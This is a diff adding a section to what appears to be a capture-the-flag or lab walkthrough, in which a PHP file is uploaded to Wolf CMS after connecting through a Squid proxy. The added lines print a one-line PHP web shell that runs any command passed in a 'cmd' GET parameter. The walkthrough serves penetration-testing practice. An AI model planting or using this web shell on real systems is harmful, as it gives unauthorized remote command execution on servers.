@@ -55,3 +55,10 @@ Let’s use the extension to connect to the Squid http proxy by entering in the 
 
 
 ![img](https://i.ibb.co/BT31Mx2/Screenshot-1.png)
+-----------------------------------------
+
+# 5. Wolf CMS File Upload and Permissions
+- Let’s upload a php file randomly named yaya.php that will allow shell commands to be sent via a GET request. We can use this php script
+  ```php
+  <?php if (isset($_GET['cmd'])) { print(shell_exec($_GET['cmd'])); }
+  ```
